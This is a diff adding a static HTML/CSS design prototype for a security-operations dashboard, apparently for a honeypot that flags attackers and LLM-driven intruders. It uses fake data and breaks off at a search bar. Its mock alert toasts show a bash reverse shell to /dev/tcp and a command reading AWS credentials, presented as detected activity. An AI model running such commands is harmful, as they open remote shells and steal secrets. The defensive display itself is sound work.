@@ -1,0 +1,1524 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=1400" />
+<title>Plenith SOC — Vertex Labs · MC-7A3F2D</title>
+<style>
+  /* =====================================================================
+     PLENITH DASHBOARD — v2 DESIGN PROTOTYPE
+     ---------------------------------------------------------------------
+     Single static HTML file with realistic fake data. Open in any
+     browser; no build, no JS dependencies. Vanilla HTML/CSS only.
+     Inline SVG for sparklines, gauges, severity glyphs.
+
+     Design language:
+       - Dark surface, monospaced data, sans chrome
+       - Semantic severity colors (critical/high/medium/info)
+       - One accent (amber-400) for brand + live-pulse only
+       - Information density: 25+ signals visible without scroll
+       - Hover = drill-affordance; click-to-detail will land in v2.1
+     ===================================================================== */
+
+  :root {
+    /* Surfaces — zinc / slate base, layered */
+    --bg:         #0a0a0b;   /* page */
+    --surface:    #131316;   /* cards */
+    --surface-2:  #1a1a1f;   /* nested */
+    --surface-3:  #232328;   /* row hover */
+    --border:     #2a2a30;
+    --border-2:   #1f1f24;
+
+    /* Text */
+    --fg:         #f4f4f5;   /* primary */
+    --fg-2:       #a1a1aa;   /* secondary */
+    --fg-3:       #71717a;   /* tertiary */
+    --fg-4:       #52525b;   /* quaternary, hints */
+
+    /* Brand accent — amber, used sparingly */
+    --brand:      #fbbf24;
+    --brand-dim:  #92660d;
+
+    /* Severity — fully semantic */
+    --sev-critical: #ef4444;
+    --sev-high:     #f97316;
+    --sev-medium:   #eab308;
+    --sev-low:      #3b82f6;
+    --sev-info:     #71717a;
+    --sev-ok:       #10b981;
+
+    /* Counter-AI confidence — gradient floor */
+    --conf-low:   #3b82f6;
+    --conf-mid:   #eab308;
+    --conf-high:  #ef4444;
+
+    /* Layout */
+    --pad: 14px;
+    --gap: 14px;
+    --radius: 6px;
+
+    /* Typography */
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
+    --mono: "JetBrains Mono", "Berkeley Mono", "SF Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    font-size: 13px;
+    line-height: 1.4;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+  .mono { font-family: var(--mono); }
+  .dim  { color: var(--fg-3); }
+  .dim2 { color: var(--fg-4); }
+  .num  { font-family: var(--mono); font-variant-numeric: tabular-nums; }
+
+  /* =================================================================
+     TOP STRIP — deployment identity + status pulse
+     ================================================================= */
+  .top {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 18px;
+    background: linear-gradient(180deg, #0c0c0e 0%, var(--bg) 100%);
+    border-bottom: 1px solid var(--border);
+  }
+  .brand {
+    display: flex; align-items: center; gap: 12px;
+    font-family: var(--mono);
+  }
+  .brand-mark {
+    width: 22px; height: 22px;
+    border: 1.5px solid var(--brand);
+    transform: rotate(45deg);
+    position: relative;
+  }
+  .brand-mark::after {
+    content: ""; position: absolute; inset: 4px;
+    background: var(--brand);
+  }
+  .brand-name {
+    font-weight: 600; letter-spacing: 0.1em; font-size: 13px;
+  }
+  .brand-sep { color: var(--fg-4); margin: 0 6px; }
+  .brand-meta { color: var(--fg-2); font-size: 12px; }
+  .brand-meta b { color: var(--fg); font-weight: 500; }
+
+  .top-right {
+    display: flex; align-items: center; gap: 18px;
+    font-family: var(--mono); font-size: 12px;
+  }
+  .pulse-dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: var(--sev-ok);
+    box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6);
+    animation: pulse 2s infinite;
+    margin-right: 6px;
+  }
+  @keyframes pulse {
+    0%   { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6); }
+    70%  { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+  }
+  .llm-status { color: var(--fg-2); }
+  .llm-status b { color: var(--fg); font-weight: 500; }
+
+  /* =================================================================
+     KPI STRIP — five tiles at the top, dense
+     ================================================================= */
+  .kpis {
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: var(--gap);
+    padding: var(--gap) 18px;
+  }
+  .kpi {
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    border-radius: var(--radius);
+    padding: 12px 14px;
+    display: flex; flex-direction: column; gap: 4px;
+    position: relative;
+  }
+  .kpi-label {
+    font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--fg-3);
+    font-weight: 500;
+  }
+  .kpi-value {
+    font-family: var(--mono); font-size: 22px; font-weight: 500;
+    color: var(--fg);
+    line-height: 1.1;
+    display: flex; align-items: baseline; gap: 6px;
+  }
+  .kpi-delta {
+    font-size: 11px; font-family: var(--mono);
+    color: var(--fg-3);
+  }
+  .kpi-delta.up    { color: var(--sev-ok); }
+  .kpi-delta.down  { color: var(--sev-high); }
+  .kpi-delta.warn  { color: var(--sev-medium); }
+  .kpi-spark {
+    height: 22px; width: 100%;
+    position: absolute; right: 14px; bottom: 10px;
+    width: 80px;
+    opacity: 0.85;
+  }
+
+  /* =================================================================
+     MAIN GRID — engagements left, detail right
+     ================================================================= */
+  .main {
+    display: grid;
+    grid-template-columns: 1fr 480px;
+    gap: var(--gap);
+    padding: 0 18px var(--gap);
+  }
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .panel-header {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border-2);
+    display: flex; align-items: center; justify-content: space-between;
+    font-size: 11px; letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--fg-3);
+    font-weight: 500;
+  }
+  .panel-header .count {
+    font-family: var(--mono); color: var(--fg);
+    background: var(--surface-2);
+    padding: 2px 7px; border-radius: 3px;
+    font-size: 11px; letter-spacing: 0;
+  }
+  .panel-header .actions {
+    display: flex; gap: 12px; align-items: center;
+  }
+  .panel-header .filter {
+    color: var(--fg-2); cursor: pointer; font-size: 11px;
+  }
+  .panel-header .filter.active { color: var(--brand); }
+  .panel-header .filter:hover  { color: var(--fg); }
+
+  /* =================================================================
+     ENGAGEMENT LIST — the main table-ish view
+     ================================================================= */
+  .engagements {
+    display: flex; flex-direction: column;
+  }
+  .eng {
+    display: grid;
+    grid-template-columns: 6px 70px 1fr 110px 100px 96px 140px 90px;
+    gap: 12px;
+    padding: 10px 12px 10px 8px;
+    border-bottom: 1px solid var(--border-2);
+    align-items: center;
+    cursor: pointer;
+    transition: background 0.1s ease;
+  }
+  .eng:hover { background: var(--surface-3); }
+  .eng.selected {
+    background: var(--surface-3);
+  }
+  .eng.selected .eng-sev-bar { background: var(--brand); }
+  .eng-sev-bar {
+    width: 3px; height: 36px; border-radius: 2px;
+    background: var(--sev-info);
+  }
+  .eng.critical .eng-sev-bar { background: var(--sev-critical); }
+  .eng.high     .eng-sev-bar { background: var(--sev-high); }
+  .eng.medium   .eng-sev-bar { background: var(--sev-medium); }
+  .eng.low      .eng-sev-bar { background: var(--sev-low); }
+
+  .eng-id {
+    font-family: var(--mono); font-size: 12px;
+    color: var(--fg-2);
+  }
+  .eng-who {
+    display: flex; flex-direction: column;
+    overflow: hidden;
+  }
+  .eng-who .who {
+    font-family: var(--mono); font-size: 13px;
+    color: var(--fg);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .eng-who .host {
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-4);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .eng-dwell, .eng-cmds, .eng-conf, .eng-alerts, .eng-last {
+    font-family: var(--mono); font-size: 12px;
+    color: var(--fg-2);
+  }
+  .eng-dwell .big {
+    color: var(--fg); font-size: 13px;
+  }
+  .eng-conf-bar {
+    width: 100%; height: 6px;
+    background: var(--surface-2);
+    border-radius: 3px;
+    position: relative;
+    margin-top: 2px;
+  }
+  .eng-conf-bar .fill {
+    position: absolute; left: 0; top: 0; bottom: 0;
+    border-radius: 3px;
+  }
+  .eng-conf-value {
+    font-size: 11px; color: var(--fg-3);
+    display: block;
+  }
+
+  .pills { display: flex; flex-wrap: wrap; gap: 3px; }
+  .pill {
+    display: inline-block;
+    padding: 1px 5px;
+    border-radius: 2px;
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 500;
+    line-height: 14px;
+    letter-spacing: 0.02em;
+  }
+  .pill.crit { background: rgba(239, 68, 68, 0.18);  color: #fca5a5; }
+  .pill.high { background: rgba(249, 115, 22, 0.18); color: #fdba74; }
+  .pill.med  { background: rgba(234, 179, 8, 0.18);  color: #fcd34d; }
+  .pill.info { background: rgba(113, 113, 122, 0.18); color: #d4d4d8; }
+
+  .eng-last .ago { color: var(--fg-2); }
+  .eng-last .ts  { color: var(--fg-4); font-size: 11px; display: block; }
+
+  /* =================================================================
+     RIGHT COLUMN — engagement detail
+     ================================================================= */
+  .detail-panel { display: flex; flex-direction: column; }
+  .detail-header {
+    padding: 14px;
+    border-bottom: 1px solid var(--border-2);
+  }
+  .detail-id {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 6px;
+  }
+  .detail-id .badge-sev {
+    padding: 2px 6px; border-radius: 3px;
+    font-family: var(--mono); font-size: 10px; font-weight: 600;
+    letter-spacing: 0.05em;
+  }
+  .detail-id .badge-sev.crit {
+    background: var(--sev-critical); color: white;
+  }
+  .detail-id .eid {
+    font-family: var(--mono); font-size: 14px;
+    color: var(--fg);
+  }
+  .detail-meta {
+    display: grid; grid-template-columns: auto 1fr; gap: 4px 14px;
+    font-size: 12px;
+    margin-top: 6px;
+  }
+  .detail-meta .k {
+    color: var(--fg-3);
+    font-size: 11px; letter-spacing: 0.04em; text-transform: uppercase;
+  }
+  .detail-meta .v {
+    color: var(--fg); font-family: var(--mono);
+  }
+
+  /* Counter-AI radial gauge */
+  .gauge-wrap {
+    display: grid; grid-template-columns: 110px 1fr;
+    gap: 14px;
+    padding: 14px;
+    border-bottom: 1px solid var(--border-2);
+  }
+  .gauge {
+    position: relative;
+    width: 110px; height: 110px;
+  }
+  .gauge svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+  .gauge-center {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    font-family: var(--mono);
+  }
+  .gauge-val {
+    font-size: 24px; font-weight: 500; color: var(--fg);
+    line-height: 1;
+  }
+  .gauge-label {
+    font-size: 9px; letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--fg-3); margin-top: 4px;
+  }
+
+  /* Signal breakdown bars (timing / lexical / injection) */
+  .signals {
+    display: flex; flex-direction: column; gap: 7px;
+    justify-content: center;
+  }
+  .signal {
+    display: grid; grid-template-columns: 60px 1fr 36px;
+    gap: 8px; align-items: center;
+  }
+  .signal-name {
+    font-size: 10px; letter-spacing: 0.08em; text-transform: uppercase;
+    color: var(--fg-3); font-weight: 500;
+  }
+  .signal-bar {
+    height: 6px; background: var(--surface-2);
+    border-radius: 3px; position: relative; overflow: hidden;
+  }
+  .signal-fill {
+    position: absolute; left: 0; top: 0; bottom: 0;
+    border-radius: 3px;
+  }
+  .signal-fill.timing { background: linear-gradient(90deg, #6366f1, #818cf8); }
+  .signal-fill.lex    { background: linear-gradient(90deg, #8b5cf6, #a78bfa); }
+  .signal-fill.inj    { background: linear-gradient(90deg, #ec4899, #f472b6); }
+  .signal-val {
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-2); text-align: right;
+  }
+
+  .gate-pills {
+    margin-top: 6px;
+    display: flex; gap: 6px;
+  }
+  .gate-pill {
+    flex: 1;
+    text-align: center;
+    padding: 4px 6px;
+    border-radius: 3px;
+    background: var(--surface-2);
+    font-family: var(--mono); font-size: 9px;
+    letter-spacing: 0.1em; text-transform: uppercase;
+    color: var(--fg-3);
+    border: 1px solid var(--border-2);
+  }
+  .gate-pill.fired {
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+    border-color: rgba(239, 68, 68, 0.3);
+  }
+  .gate-pill.held {
+    background: rgba(16, 185, 129, 0.10);
+    color: #6ee7b7;
+    border-color: rgba(16, 185, 129, 0.25);
+  }
+
+  /* Alerts list inside detail */
+  .alerts-list {
+    padding: 8px 14px 14px;
+    border-bottom: 1px solid var(--border-2);
+  }
+  .alert {
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 8px; padding: 6px 0;
+    border-bottom: 1px dashed var(--border-2);
+    align-items: center;
+  }
+  .alert:last-child { border-bottom: none; }
+  .alert-sev {
+    padding: 1px 5px; border-radius: 2px;
+    font-family: var(--mono); font-size: 9px; font-weight: 600;
+    letter-spacing: 0.05em; min-width: 38px; text-align: center;
+  }
+  .alert-sev.crit { background: var(--sev-critical); color: white; }
+  .alert-sev.high { background: var(--sev-high); color: #1a0f00; }
+  .alert-sev.med  { background: var(--sev-medium); color: #1a1500; }
+  .alert-name {
+    font-family: var(--mono); font-size: 12px;
+    color: var(--fg);
+  }
+  .alert-trigger {
+    font-family: var(--mono); font-size: 10px;
+    color: var(--fg-3);
+    grid-column: 2 / 4;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .alert-ts {
+    font-family: var(--mono); font-size: 10px;
+    color: var(--fg-4);
+  }
+
+  /* Command timeline */
+  .timeline {
+    padding: 8px 14px 14px;
+  }
+  .cmd {
+    display: grid;
+    grid-template-columns: 62px 80px 1fr;
+    gap: 10px;
+    padding: 3px 0;
+    font-family: var(--mono); font-size: 11.5px;
+    line-height: 1.5;
+  }
+  .cmd-ts { color: var(--fg-4); }
+  .cmd-src {
+    color: var(--fg-3);
+    font-size: 10px;
+    padding: 0 4px; border-radius: 2px;
+    background: var(--surface-2);
+    text-align: center;
+  }
+  .cmd-src.cache    { color: #93c5fd; background: rgba(59, 130, 246, 0.10); }
+  .cmd-src.vfs      { color: #6ee7b7; background: rgba(16, 185, 129, 0.10); }
+  .cmd-src.sim-bot  { color: #c4b5fd; background: rgba(139, 92, 246, 0.10); }
+  .cmd-src.llm      { color: #f0abfc; background: rgba(217, 70, 239, 0.10); }
+  .cmd-src.alert    { color: #fca5a5; background: rgba(239, 68, 68, 0.12); font-weight: 600; }
+  .cmd-src.find     { color: #fdba74; background: rgba(249, 115, 22, 0.10); }
+  .cmd-src.error    { color: #f87171; background: rgba(239, 68, 68, 0.10); }
+  .cmd-text {
+    color: var(--fg);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .cmd.alerted {
+    background: rgba(239, 68, 68, 0.06);
+    margin: 0 -14px; padding-left: 14px; padding-right: 14px;
+    border-left: 2px solid var(--sev-critical);
+  }
+
+  /* =================================================================
+     BOTTOM ROW — alerts rate sparkline, DNS feed, signal map
+     ================================================================= */
+  .bottom {
+    display: grid;
+    grid-template-columns: 1.4fr 1fr 1fr;
+    gap: var(--gap);
+    padding: 0 18px var(--gap);
+  }
+  .chart-wrap { padding: 14px; }
+  .chart-stats {
+    display: flex; gap: 18px;
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-3);
+    margin-bottom: 10px;
+  }
+  .chart-stat .v { color: var(--fg); font-size: 14px; }
+  .chart-stat .l {
+    font-size: 9px; letter-spacing: 0.1em; text-transform: uppercase;
+  }
+
+  /* DNS feed */
+  .dns-feed {
+    padding: 6px 14px 14px;
+    max-height: 220px; overflow: hidden;
+    font-family: var(--mono); font-size: 11px;
+  }
+  .dns-row {
+    display: grid; grid-template-columns: 50px 1fr auto auto;
+    gap: 10px;
+    padding: 4px 0;
+    border-bottom: 1px dashed var(--border-2);
+    align-items: center;
+  }
+  .dns-row:last-child { border-bottom: none; }
+  .dns-ts { color: var(--fg-4); font-size: 10px; }
+  .dns-host { color: var(--fg); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .dns-type { color: var(--fg-3); font-size: 10px; }
+  .dns-result {
+    padding: 1px 5px; border-radius: 2px; font-size: 10px;
+    background: rgba(16, 185, 129, 0.10);
+    color: #6ee7b7;
+  }
+  .dns-result.blocked {
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+  .dns-result.nxdomain {
+    background: rgba(234, 179, 8, 0.10);
+    color: #fcd34d;
+  }
+
+  /* Sparkline chart - alerts rate over time */
+  .sparkline-large {
+    width: 100%; height: 80px;
+    display: block;
+  }
+
+  /* Signal-map heatmap */
+  .heatmap {
+    padding: 14px;
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 8px;
+  }
+  .heatmap-row {
+    display: grid;
+    grid-template-columns: 90px 1fr;
+    gap: 10px;
+    align-items: center;
+  }
+  .heatmap-label {
+    font-family: var(--mono); font-size: 10px;
+    color: var(--fg-3);
+    letter-spacing: 0.02em;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .heatmap-cells {
+    display: grid; grid-template-columns: repeat(24, 1fr); gap: 2px;
+  }
+  .hcell {
+    aspect-ratio: 1;
+    border-radius: 1.5px;
+    background: var(--surface-2);
+  }
+  .hcell.h1 { background: rgba(251, 191, 36, 0.15); }
+  .hcell.h2 { background: rgba(251, 191, 36, 0.30); }
+  .hcell.h3 { background: rgba(251, 191, 36, 0.55); }
+  .hcell.h4 { background: rgba(251, 191, 36, 0.80); }
+  .hcell.h5 { background: var(--brand); }
+  .hcell.c4 { background: rgba(239, 68, 68, 0.70); }
+  .hcell.c5 { background: var(--sev-critical); }
+
+  /* Footer strip */
+  .footer {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 8px 18px;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-4);
+  }
+  .footer a { color: var(--fg-3); text-decoration: none; }
+  .footer a:hover { color: var(--fg); }
+
+  /* Tiny utility helpers */
+  .row { display: flex; align-items: center; gap: 8px; }
+  .grow { flex: 1; }
+  .sep { color: var(--fg-4); margin: 0 4px; }
+
+  /* =================================================================
+     NEW: Pop-out icon on panel headers — opens that panel in its own
+     window (for multi-display SOC setups). The functional version
+     wires this to window.open('/panel/<name>') in dashboard.py.
+     ================================================================= */
+  .panel-header .actions { gap: 14px; }
+  .icon-btn {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 22px; height: 22px;
+    border-radius: 3px;
+    color: var(--fg-3);
+    cursor: pointer;
+    transition: background 0.1s ease, color 0.1s ease;
+    font-size: 14px;
+    user-select: none;
+  }
+  .icon-btn:hover {
+    background: var(--surface-2);
+    color: var(--fg);
+  }
+  .icon-btn svg { width: 12px; height: 12px; }
+
+  /* =================================================================
+     NEW: Notification toasts — top-right stack. Browser Notifications
+     API (requestPermission) handles desktop-level notifications when
+     the tab isn't focused; this in-page stack covers the focused case
+     and acts as a recent-events recap pinned to the viewport.
+     ================================================================= */
+  .toast-stack {
+    position: fixed;
+    top: 14px; right: 14px;
+    display: flex; flex-direction: column; gap: 8px;
+    z-index: 200;
+    width: 380px;
+    pointer-events: none;
+  }
+  .toast {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--sev-info);
+    border-radius: var(--radius);
+    padding: 10px 12px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5),
+                0 2px 4px rgba(0, 0, 0, 0.3);
+    pointer-events: auto;
+    animation: toast-in 0.25s ease;
+    position: relative;
+  }
+  .toast.critical { border-left-color: var(--sev-critical); }
+  .toast.high     { border-left-color: var(--sev-high); }
+  .toast.medium   { border-left-color: var(--sev-medium); }
+  .toast.info     { border-left-color: var(--sev-info); }
+  @keyframes toast-in {
+    from { transform: translateX(20px); opacity: 0; }
+    to   { transform: translateX(0); opacity: 1; }
+  }
+  .toast-head {
+    display: flex; align-items: center; gap: 6px;
+    font-family: var(--mono);
+    font-size: 10px; letter-spacing: 0.08em; text-transform: uppercase;
+    color: var(--fg-3);
+    margin-bottom: 4px;
+  }
+  .toast-head .sev-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--sev-info);
+  }
+  .toast.critical .sev-dot { background: var(--sev-critical);
+                              box-shadow: 0 0 8px var(--sev-critical); }
+  .toast.high     .sev-dot { background: var(--sev-high); }
+  .toast.medium   .sev-dot { background: var(--sev-medium); }
+  .toast-head .ts { color: var(--fg-4); margin-left: auto; }
+  .toast-title {
+    font-family: var(--mono); font-size: 13px;
+    color: var(--fg);
+    line-height: 1.3;
+  }
+  .toast-body {
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-3);
+    margin-top: 4px;
+    overflow: hidden; text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .toast-actions {
+    display: flex; gap: 10px;
+    margin-top: 8px;
+    font-size: 11px;
+  }
+  .toast-actions a {
+    color: var(--fg-2);
+    text-decoration: none;
+    cursor: pointer;
+  }
+  .toast-actions a:hover { color: var(--brand); }
+  .toast-actions a.primary { color: var(--brand); }
+  .toast-close {
+    position: absolute; top: 8px; right: 8px;
+    color: var(--fg-4); cursor: pointer;
+    font-size: 14px; line-height: 1;
+    width: 16px; height: 16px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .toast-close:hover { color: var(--fg); }
+
+  /* =================================================================
+     NEW: Search / filter bar above engagement list
+     ================================================================= */
+  .search-bar {
+    padding: 8px 12px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border-2);
+    display: flex; gap: 8px; align-items: center;
+  }
+  .search-input {
+    flex: 1;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-radius: 4px;
+    padding: 6px 10px;
+    color: var(--fg);
+    font-family: var(--mono);
+    font-size: 12px;
+    outline: none;
+  }
+  .search-input:focus { border-color: var(--brand-dim); }
+  .search-input::placeholder { color: var(--fg-4); }
+  .search-chip {
+    display: inline-flex; align-items: center; gap: 4px;
+    padding: 4px 8px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-radius: 3px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--fg-2);
+    cursor: pointer;
+  }
+  .search-chip:hover { color: var(--fg); border-color: var(--border); }
+  .search-chip.active {
+    color: var(--brand);
+    border-color: var(--brand-dim);
+    background: rgba(251, 191, 36, 0.06);
+  }
+  .search-chip .x { color: var(--fg-4); font-size: 14px; line-height: 1; }
+  .kbd {
+    display: inline-block;
+    padding: 1px 5px;
+    background: var(--surface-3);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--fg-3);
+  }
+
+  /* =================================================================
+     NEW: TV-mode / wall-display toggle in the top strip.
+     When activated (functional version): hides chrome, scales fonts
+     to 1.5x, auto-rotates focused engagement every 30s — for the
+     big monitor in the SOC. Pure CSS class-toggle on <body>.
+     ================================================================= */
+  .top-actions {
+    display: flex; gap: 6px;
+    margin-left: 18px;
+  }
+  .top-action {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    color: var(--fg-2);
+    font-family: var(--mono);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.1s ease;
+  }
+  .top-action:hover {
+    background: var(--surface-2);
+    color: var(--fg);
+    border-color: var(--border);
+  }
+  .top-action.active {
+    background: rgba(251, 191, 36, 0.08);
+    border-color: var(--brand-dim);
+    color: var(--brand);
+  }
+  .top-action .ico { font-size: 13px; line-height: 1; }
+  .top-action .badge {
+    background: var(--sev-critical);
+    color: white;
+    font-size: 9px; font-weight: 600;
+    padding: 0 4px; border-radius: 2px;
+    margin-left: 2px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ============================================================== -->
+<!-- NOTIFICATION TOAST STACK                                          -->
+<!-- ---------------------------------------------------------------- -->
+<!-- In the functional version, toasts arrive via SSE alert-pushed     -->
+<!-- events. Each critical/high alert also fires a browser Notification -->
+<!-- (after one-time permission grant) so analysts get a desktop pop   -->
+<!-- when the tab isn't focused. Tab title also updates with badge.    -->
+<!-- ============================================================== -->
+<div class="toast-stack" id="toast-stack">
+  <div class="toast critical">
+    <div class="toast-close">×</div>
+    <div class="toast-head">
+      <span class="sev-dot"></span>
+      <span>CRITICAL · alert_reverse_shell</span>
+      <span class="ts">just now</span>
+    </div>
+    <div class="toast-title">2b51584b · jdoe@10.0.0.14</div>
+    <div class="toast-body">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</div>
+    <div class="toast-actions">
+      <a class="primary">View engagement</a>
+      <a>Acknowledge</a>
+      <a>Isolate session</a>
+    </div>
+  </div>
+  <div class="toast critical">
+    <div class="toast-close">×</div>
+    <div class="toast-head">
+      <span class="sev-dot"></span>
+      <span>CRITICAL · alert_attacker_llm_proven</span>
+      <span class="ts">38s</span>
+    </div>
+    <div class="toast-title">8d1bd057 · root@10.10.99.4</div>
+    <div class="toast-body">trap marker MC7A3F2D echoed back in command stream</div>
+    <div class="toast-actions">
+      <a class="primary">View engagement</a>
+      <a>Acknowledge</a>
+    </div>
+  </div>
+  <div class="toast high">
+    <div class="toast-close">×</div>
+    <div class="toast-head">
+      <span class="sev-dot"></span>
+      <span>HIGH · alert_credential_exfil</span>
+      <span class="ts">2m</span>
+    </div>
+    <div class="toast-title">a32be451 · agarcia@172.18.0.1</div>
+    <div class="toast-body">cat /home/jdoe/.aws/credentials</div>
+  </div>
+</div>
+
+<!-- ============================================================== -->
+<!-- TOP STRIP                                                         -->
+<!-- ============================================================== -->
+<div class="top">
+  <div class="brand">
+    <div class="brand-mark"></div>
+    <span class="brand-name">PLENITH</span>
+    <span class="brand-sep">·</span>
+    <span class="brand-meta">deployment <b>VERTEX LABS</b> <span class="dim2">MC-7A3F2D</span> <span class="dim2">plenith.vertex.corp</span></span>
+    <!-- Top-strip controls: TV mode, notification preferences, multi-display layouts -->
+    <div class="top-actions">
+      <span class="top-action" title="Toggle wall-display mode (1.5x scale, auto-focus rotation)">
+        <span class="ico">▣</span> TV mode
+      </span>
+      <span class="top-action active" title="Browser notifications enabled — grant permission to also receive desktop pops when tab unfocused">
+        <span class="ico">◉</span> Notify <span class="badge">3</span>
+      </span>
+      <span class="top-action" title="Saved layouts: load a multi-monitor configuration that opens the right panels in the right windows">
+        <span class="ico">▦</span> Layout
+      </span>
+    </div>
+  </div>
+  <div class="top-right">
+    <span class="llm-status"><span class="pulse-dot"></span>LLM <b>qwen2.5-14b</b> <span class="dim2">@ lm-studio :1234</span></span>
+    <span class="dim">uptime 14d 02h 17m</span>
+    <span class="dim">sig <span class="mono" style="color: var(--brand);">9F2A7B</span></span>
+    <span class="dim">rotated Q2-2026</span>
+  </div>
+</div>
+
+<!-- ============================================================== -->
+<!-- KPI STRIP                                                         -->
+<!-- ============================================================== -->
+<div class="kpis">
+
+  <div class="kpi">
+    <div class="kpi-label">Active engagements</div>
+    <div class="kpi-value">14 <span class="kpi-delta up">+3 / 24h</span></div>
+    <svg class="kpi-spark" viewBox="0 0 80 22" preserveAspectRatio="none">
+      <polyline fill="none" stroke="var(--fg-3)" stroke-width="1.2"
+        points="0,16 10,13 20,15 30,12 40,8 50,11 60,7 70,5 80,4" />
+    </svg>
+  </div>
+
+  <div class="kpi">
+    <div class="kpi-label">Alerts (24h)</div>
+    <div class="kpi-value">37 <span class="kpi-delta warn">+12%</span></div>
+    <svg class="kpi-spark" viewBox="0 0 80 22" preserveAspectRatio="none">
+      <polyline fill="none" stroke="var(--sev-medium)" stroke-width="1.2"
+        points="0,18 10,14 20,16 30,11 40,9 50,12 60,6 70,8 80,3" />
+    </svg>
+  </div>
+
+  <div class="kpi">
+    <div class="kpi-label">Counter-AI detections</div>
+    <div class="kpi-value">2 <span class="kpi-delta">of 14</span></div>
+    <svg class="kpi-spark" viewBox="0 0 80 22" preserveAspectRatio="none">
+      <polyline fill="none" stroke="var(--brand)" stroke-width="1.2"
+        points="0,20 20,18 30,16 40,12 50,9 60,11 70,6 80,4" />
+    </svg>
+  </div>
+
+  <div class="kpi">
+    <div class="kpi-label">Proof-by-trap</div>
+    <div class="kpi-value">1 <span class="kpi-delta warn">↑ first this month</span></div>
+  </div>
+
+  <div class="kpi">
+    <div class="kpi-label">Dwell p50</div>
+    <div class="kpi-value">4m 22s</div>
+    <svg class="kpi-spark" viewBox="0 0 80 22" preserveAspectRatio="none">
+      <polyline fill="none" stroke="var(--fg-3)" stroke-width="1.2"
+        points="0,10 10,9 20,11 30,8 40,12 50,9 60,10 70,11 80,9" />
+    </svg>
+  </div>
+
+  <div class="kpi">
+    <div class="kpi-label">Decoys swallowed</div>
+    <div class="kpi-value">19 / 41 <span class="kpi-delta">46%</span></div>
+  </div>
+
+</div>
+
+<!-- ============================================================== -->
+<!-- MAIN ROW: ENGAGEMENTS LEFT, DETAIL RIGHT                          -->
+<!-- ============================================================== -->
+<div class="main">
+
+  <!-- LEFT: engagement list -->
+  <div class="panel engagements-panel">
+    <div class="panel-header">
+      <span>Engagements live</span>
+      <div class="actions">
+        <span class="filter active">all (14)</span>
+        <span class="filter">critical (2)</span>
+        <span class="filter">llm-detected (2)</span>
+        <span class="filter">last 1h (5)</span>
+        <span class="count">14</span>
+        <!-- Pop-out: opens this panel in its own window. The functional
+             version routes to /panel/engagements which renders this
+             same panel standalone, subscribed to its own SSE stream
+             so a dedicated monitor can show only this view. -->
+        <span class="icon-btn" title="Open in new window (multi-display)">
+          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M7 1H11V5"/>
+            <path d="M11 1L5.5 6.5"/>
+            <path d="M9 7V11H1V3H5"/>
+          </svg>
+        </span>
+      </div>
+    </div>
+    <!-- Search / filter bar -->
